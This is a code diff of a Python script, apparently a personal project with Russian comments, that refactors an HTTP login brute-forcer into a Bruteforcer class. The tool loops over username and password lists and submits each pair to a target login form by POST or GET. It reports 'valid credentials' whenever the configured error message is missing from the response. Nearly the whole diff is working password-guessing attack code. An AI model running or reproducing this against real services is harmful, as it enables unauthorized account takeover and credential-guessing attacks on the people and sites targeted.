@@ -18,7 +18,7 @@ parser.add_argument('-U', '--usernames', help="List with usernames for attack")
 parser.add_argument('-v', '--verbose', help="Start verbose mode", default=False)
 args = parser.parse_args()
 
-# Добавить обработку потоков, http_get метод, ssl/tls
+# Добавить обработку потоков, ssl/tls
 # Добавить обработку большего количества параметров
 # Добавить подробный режим
 
@@ -31,81 +31,80 @@ for i in range(1000):
         passwords.append(password + letter)
 '''
 
-def init_data():
-    URL = args.ip
-    method = args.method
-    threads = args.threads
-    keys = args.keys.split(",")
-    error = args.error_message
-    verbose = args.verbose
-    first = args.first
+class Bruteforcer:
+    def __init__(self):
+        self.url = args.ip
+        self.method = args.method
+        self.threads = args.threads
+        self.keys = args.keys.split(",")
+        self.error = args.error_message
+        self.verbose = args.verbose
+        self.first = args.first
 
-    if args.username == None and args.usernames != None:
-        with open(args.usernames, "r") as file:
-            usernames = []
-            for user in file.readlines():
-                usernames.append(user.strip())
-    elif args.username != None and args.usernames == None:
-        usernames = [args.username]
-    elif args.username != None and args.usernames != None:
-        print ("[*] You want to use -u and -U options both.You need to choose: username (-u option) of file with usernames (-U option).")
-        sys.exit()
-    else:
-        print ("[*] You need to specify -u or -U option.")
-        sys.exit()
+        if args.username == None and args.usernames != None:
+            with open(args.usernames, "r") as file:
+                self.usernames = []
+                for user in file.readlines():
+                    self.usernames.append(user.strip())
+        elif args.username != None and args.usernames == None:
+            self.usernames = [args.username]
+        elif args.username != None and args.usernames != None:
+            print ("[*] You want to use -u and -U options both.You need to choose: username (-u option) of file with usernames (-U option).")
+            sys.exit()
+        else:
+            print ("[*] You need to specify -u or -U option.")
+            sys.exit()
 
-    if args.password == None and args.passwords != None:
-        with open(args.passwords, "r") as file:
-            passwords = []
-            for passwd in file.readlines():
-                passwords.append(passwd.strip())
-    elif args.password != None and args.passwords == None:
-        passwords = [args.password]
-    elif args.password != None and args.passwords != None:
-        print ("[*] You want to use -p and -P options both.You need to choose: password (-p option) of file with passwords (-P option).")
-        sys.exit()
-    else:
-        print ("[*] You need to specify -p or -P option.")
-        sys.exit()
+        if args.password == None and args.passwords != None:
+            with open(args.passwords, "r") as file:
+                self.passwords = []
+                for passwd in file.readlines():
+                    self.passwords.append(passwd.strip())
+        elif args.password != None and args.passwords == None:
+            self.passwords = [args.password]
+        elif args.password != None and args.passwords != None:
+            print ("[*] You want to use -p and -P options both.You need to choose: password (-p option) of file with passwords (-P option).")
+            sys.exit()
+        else:
+            print ("[*] You need to specify -p or -P option.")
+            sys.exit()
 
-    return URL, method, threads, keys, error, usernames, passwords, verbose, first
+    def http_post_brute(self):
+        count = 0
+        for username in self.usernames:
+            for password in self.passwords:
+                data = {self.keys[0]:username, self.keys[1]:password}
+                response = requests.post(self.url, data=data)
 
-def http_post_brute(usernames, passwords, URL, keys, threads, error, verbose, first):
-    count = 0
-    for username in usernames:
-        for password in passwords:
-            data = {keys[0]:username, keys[1]:password}
-            response = requests.post(URL, data=data)
-
-            if error not in response.text and count < int(first):
-                print (count, first)
-                print (f'[+] Found valid credentials: {username}:{password}')
-                count += 1
-            elif count == int(first):
-                return
-            else:
-                print (f'[*] Attempted: {username}:{password}')
+                if self.error not in response.text and count < int(self.first):
+                    print (f'[+] Found valid credentials: {username}:{password}')
+                    count += 1
+                elif count == int(self.first):
+                    return
+                else:
+                    print (f'[*] Attempted: {username}:{password}')
     
 
-def http_get_brute(usernames, passwords, URL, keys, threads, error): # Не работает
-    for username in usernames:
-        for password in passwords:
-            response = requests.get(f"{URL}?{keys[0]}={username}&{keys[1]}={password}")
-            if error not in response.text:
-                print (f'[+] Found valid credentials: {username}:{password}')
-                return
-            else:
-                print (f'[*] Attempted: {username}:{password}')
+    def http_get_brute(self):
+        for username in self.usernames:
+            for password in self.passwords:
+                response = requests.get(f"{self.url}?{self.keys[0]}={username}&{self.keys[1]}={password}")
+            
+                if self.error not in response.text:
+                    print (f'[+] Found valid credentials: {username}:{password}')
+                    return
+                else:
+                    print (f'[*] Attempted: {username}:{password}')
 
 
-def start_scan(URL, method, threads, usernames, passwords, verbose, first):
-    if args.method == 'http_post':
-        http_post_brute(usernames, passwords, URL, keys, threads, error, verbose, first) 
-    elif args.method == 'http_get':
-        http_get_brute(usernames, passwords, URL, keys, threads, error)
-    else:
-        pass
+    def start_scan(self):
+        if self.method == 'http_post':
+            self.http_post_brute() 
+        elif args.method == 'http_get':
+            self.http_get_brute()
+        else:
+            pass
 
 if __name__ == "__main__":
-    URL, method, threads, keys, error, usernames, passwords, verbose, first = init_data()
-    start_scan(URL, method, threads, usernames, passwords, verbose, first)
+    bruteforcer = Bruteforcer()
+    bruteforcer.start_scan()
